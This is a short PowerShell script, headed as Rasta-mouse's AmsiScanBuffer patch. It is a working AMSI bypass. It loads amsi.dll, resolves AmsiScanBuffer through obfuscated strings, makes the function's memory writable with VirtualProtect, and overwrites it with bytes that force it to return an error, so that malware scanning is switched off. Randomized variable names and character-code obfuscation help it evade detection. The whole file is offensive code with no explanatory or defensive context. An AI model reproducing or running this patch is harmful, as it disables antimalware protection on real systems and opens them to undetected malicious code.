#Rasta-mouses Amsi-Scan-Buffer patch \n
$WB6 = @"
using System;
using System.Runtime.InteropServices;
public class WB6 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Abd742spZ9SoSlCcnTE, string xgJkryg9phrrbIHd);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr NEvs924i, UIntPtr EGGeYDwigtAAq0, uint JBG2vJ4, out uint zxDkyvUWAsSj);
}
"@

Add-Type $WB6

$oXcwuM7ycrel = [WB6]::LoadLibrary("$(('àmsî'+'.dll').normAliZe([CHAr](70*21/21)+[CHar](75+36)+[cHAR]([BYte]0x72)+[cHAR](109)+[CHAr]([ByTE]0x44)) -replace [cHaR](92*28/28)+[CHAR](16+96)+[cHAr]([bYtE]0x7b)+[cHAR](42+35)+[cHAR]([BYTe]0x6e)+[cHaR](125+28-28))")
$cxapn = [WB6]::GetProcAddress($oXcwuM7ycrel, "$(('Ám'+'sî'+'Sc'+'ãn'+'Bú'+'ff'+'ér').nORMALizE([chAR](70*22/22)+[chAr]([bYTe]0x6f)+[CHAR]([BYte]0x72)+[chAR](54+55)+[cHAr](53+15)) -replace [chAr]([bYtE]0x5c)+[chAR](112+54-54)+[chaR](123+110-110)+[Char]([BytE]0x4d)+[CHaR]([BYtE]0x6e)+[CHaR](125))")
$p = 0
[WB6]::VirtualProtect($cxapn, [uint32]5, 0x40, [ref]$p)
$eBurmgzIx = "0xB8"
$MAgRAA = "0x57"
$DaCvYo4lqFAU = "0x00"
$WWMEkTOe = "0x07"
$n6X9xO_ZU7mK = "0x80"
$TEo5cQA381eVuDrsrj = "0xC3"
$wbJ7VX36etO14Xw = [Byte[]] ($eBurmgzIx,$MAgRAA,$DaCvYo4lqFAU,$WWMEkTOe,+$n6X9xO_ZU7mK,+$TEo5cQA381eVuDrsrj)
[System.Runtime.InteropServices.Marshal]::Copy($wbJ7VX36etO14Xw, 0, $cxapn, 6)
